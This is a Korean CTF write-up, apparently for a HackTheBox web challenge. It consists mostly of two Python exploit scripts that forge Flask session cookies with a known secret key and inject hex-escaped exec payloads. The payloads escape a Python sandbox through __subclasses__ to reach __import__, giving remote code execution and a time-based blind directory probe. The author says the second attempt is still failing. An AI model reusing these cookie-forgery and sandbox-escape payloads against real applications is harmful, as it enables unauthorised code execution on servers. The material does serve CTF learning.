# 첫 번째 시도

> Poc Code

```python

import flask_unsign
import requests
import time
from pwn import *

url = "http://159.65.95.35:32187/"
SECRET_KEY = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'

filtering =  ['[', '(', '_', '.']
bypass = []
for i in range(len(filtering)):
    bypass.append(str(hex(ord(filtering[i]))).replace("0", "\\"))

def h(s):
    for i in range(len(bypass)):
        s = s.replace(filtering[i], bypass[i])
    return s

def GET(u, c):
    cookies = {'session':c}
    first_time = time.time()
    requests.get(u, cookies=cookies)
    log.info("It took {} seconds".format(time.time() - first_time))

pay = '''0\nexec "add=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']\\nadd('time').sleep(10)"'''
pay = h(pay)

token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
log.info("The token is " + token)

GET(url, token)
'''
Original Payload

Reference : https://stackoverflow.com/questions/59482234/is-an-execstring-builtins-none-a-secure-way-to-execute-user-inpu
Original Payload : s = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']"

위 오리지날 페이로드를 한 번에 hex로 바꾸고 사용하니 중간에 에러가 난다. 그래서 다음 칸으로 띄우고 exec를 새로 실행하는 방식으로 했다.
그래서 다음 칸으로 띄우고 exec를 새로 실행하는 방식으로 하고, __builtins__ 객체를 이용해서 가져온 것을 add라는 변수에 넣어주고, add('os').system(ls)와 같은 방식으로 익스를 진행하니 에러가 나지 않았다.
그리고 subprocess를 이용해 flaks-unsign --sign -c를 이용해서 jwt를 만들어주려 했는데, 확인해보니 그냥 모듈로도 사용이 가능했다.
'''
```
위와 같이 RCE는 성공. 하지만 응답에 exec 함수에 대한 리턴 값이 포함되어 있지 않아 Blind Command Injection 시도. 하지만 요청이 안 옴. 결국 다른 방법 찾기로 함.

---
# 두 번째 시도

![](https://github.com/wjddnjs33/exploit-code/blob/main/wargame/hackthebox.eu/Interdimensional%20internet/images/oh.png?raw=true)

위와 같이 Time Based Injection을 이용해서 디렉터리와 값을 그냥 다 뽑아 내야 할 거 같은데, 문법 헷갈림 ㅋㅋ

```python

import flask_unsign
import requests
import time
import sys
from pwn import *

url = "http://138.68.182.108:31162"
SECRET_KEY = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'

filtering =  ['[', '(', '_', '.']
bypass = []
for i in range(len(filtering)):
    bypass.append(str(hex(ord(filtering[i]))).replace("0", "\\"))

def h(s):
    for i in range(len(bypass)):
        s = s.replace(filtering[i], bypass[i])
    return s

def GET(u, c, a):
    cookies = {'session':c}
    first_time = time.time()
    requests.get(u, cookies=cookies)
    print("It took {} seconds".format(time.time() - first_time))
    if time.time() - first_time > 5:
        log.info("It took {} seconds".format(time.time() - first_time))
        sys.exit()


for i in range(1, 300):
#pay = '''1
    #exec "i=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']\\nif 1 == 0:i('time').sleep(10)"'''
    pay = '''1\nexec "i=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']\\nif len(i(\'os\').listdir(\'./\')) == ''' + str(i) + ''':i(\'time\').sleep(10)"'''
    print(pay)
    pay = h(pay)

    token = flask_unsign.sign({'ingredient':'i', 'measurements':pay}, SECRET_KEY)
    log.info("The token is " + token)
    GET(url, token, i)
'''
Original Payload

Reference : https://stackoverflow.com/questions/59482234/is-an-execstring-builtins-none-a-secure-way-to-execute-user-inpu
Original Payload : s = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']"

호호 왜 IF 문에서 말썽일까 
'''
```

 fuck 일단 if문 활용까지 됐는데, os.listdir()의 값을 비교하면 잘 안 됨..
